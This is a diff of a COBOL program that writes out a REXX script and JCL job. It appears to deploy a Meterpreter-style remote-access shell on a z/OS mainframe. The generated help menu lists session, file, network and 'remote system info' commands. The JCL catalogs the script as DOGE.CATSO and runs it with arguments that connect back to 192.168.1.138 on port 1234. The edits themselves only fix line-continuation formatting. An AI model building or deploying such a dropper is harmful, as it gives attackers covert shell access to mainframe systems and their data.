            MOVE '       "Core Commands"||NEWLINE,' TO WS-LINE(624)
            MOVE '       "============="||NEWLINE||NEWLINE,'
-      -     TO WS-LINE(625)
+            TO WS-LINE(625)
            MOVE '       "  Command           Description"||NEWLINE,'
-      -     TO WS-LINE(626)
+            TO WS-LINE(626)
            MOVE '       "  -------           -----------"||NEWLINE,'
-      -     TO WS-LINE(627)
+            TO WS-LINE(627)
            MOVE '       "  help              Help Menu"||NEWLINE,'
-      -     TO WS-LINE(628)
+            TO WS-LINE(628)
            MOVE '       "  exit              Terminate the session"||NEW
       -    'LINE,' TO WS-LINE(629)
            MOVE '       "  quit              Terminate the session"||NEW
@@ -933,11 +933,11 @@
            MOVE '       NEWLINE||NEWLINE,' TO WS-LINE(631)
            MOVE '       "Filesystem Commands"||NEWLINE,' TO WS-LINE(632)
            MOVE '       "==================="||NEWLINE||NEWLINE,'
-      -     TO WS-LINE(633)
+            TO WS-LINE(633)
            MOVE '       "  Command           Description"||NEWLINE,'
-      -     TO WS-LINE(634)
+            TO WS-LINE(634)
            MOVE '       "  -------           -----------"||NEWLINE,'
-      -     TO WS-LINE(635)
+            TO WS-LINE(635)
            MOVE '       "  cat               Show contents of dataset"||
       -    'NEWLINE,' TO WS-LINE(636)
            MOVE '       "  cp                copies a file to a new file
@@ -945,7 +945,7 @@
            MOVE '       "  ls                list datasets in HLQ"||NEWL
       -    'INE,' TO WS-LINE(638)
            MOVE '       "  delete            deletes a file"||NEWLINE,'
-      -     TO WS-LINE(639)
+            TO WS-LINE(639)
            MOVE '       "  del               also deletes a file"||NEWLI
       -    'NE,' TO WS-LINE(640)
            MOVE '       "  lsmem             Lists files and members"||N
@@ -955,11 +955,11 @@
            MOVE '       NEWLINE||NEWLINE,' TO WS-LINE(643)
            MOVE '       "Networking Commands"||NEWLINE,' TO WS-LINE(644)
            MOVE '       "==================="||NEWLINE||NEWLINE,'
-      -     TO WS-LINE(645)
+            TO WS-LINE(645)
            MOVE '       "  Command           Description"||NEWLINE,'
-      -     TO WS-LINE(646)
+            TO WS-LINE(646)
            MOVE '       "  -------           -----------"||NEWLINE,'
-      -     TO WS-LINE(647)
+            TO WS-LINE(647)
            MOVE '       "  ipconfig          Display interfaces"||NEWLIN
       -    'E,' TO WS-LINE(648)
            MOVE '       "  ifconfig          Display interfaces"||NEWLIN
@@ -967,11 +967,11 @@
            MOVE '       NEWLINE||NEWLINE,' TO WS-LINE(650)
            MOVE '       "System Commands"||NEWLINE,' TO WS-LINE(651)
            MOVE '       "==============="||NEWLINE||NEWLINE,'
-      -     TO WS-LINE(652)
+            TO WS-LINE(652)
            MOVE '       "  Command           Description"||NEWLINE,'
-      -     TO WS-LINE(653)
+            TO WS-LINE(653)
            MOVE '       "  -------           -----------"||NEWLINE,'
-      -     TO WS-LINE(654)
+            TO WS-LINE(654)
            MOVE '       "  getuid            Get current user name"||NEW
       -    'LINE,' TO WS-LINE(655)
            MOVE '       "  sysinfo           Remote system info (i.e OS)
@@ -997,12 +997,12 @@
            MOVE '     return help' TO WS-LINE(668)
            MOVE '/XX' TO WS-LINE(669)
            MOVE '//SYSUT2   DD DISP=(NEW,CATLG,DELETE),DSN=DOGE.CATSO,'
-      -     TO WS-LINE(670)
+            TO WS-LINE(670)
            MOVE '//         SPACE=(CYL,10)' TO WS-LINE(671)
            MOVE '//RUNCAT  EXEC PGM=IKJEFT01' TO WS-LINE(672)
            MOVE '//SYSTSIN  DD *' TO WS-LINE(673)
            MOVE '  EXEC ''DOGE.CATSO'' ''R 192.168.1.138 1234'''
-      -     TO WS-LINE(674)
+            TO WS-LINE(674)
            MOVE '/*' TO WS-LINE(675)
            MOVE '//SYSIN    DD DUMMY' TO WS-LINE(676)
            MOVE '//SYSTSPRT DD SYSOUT=*' TO WS-LINE(677).
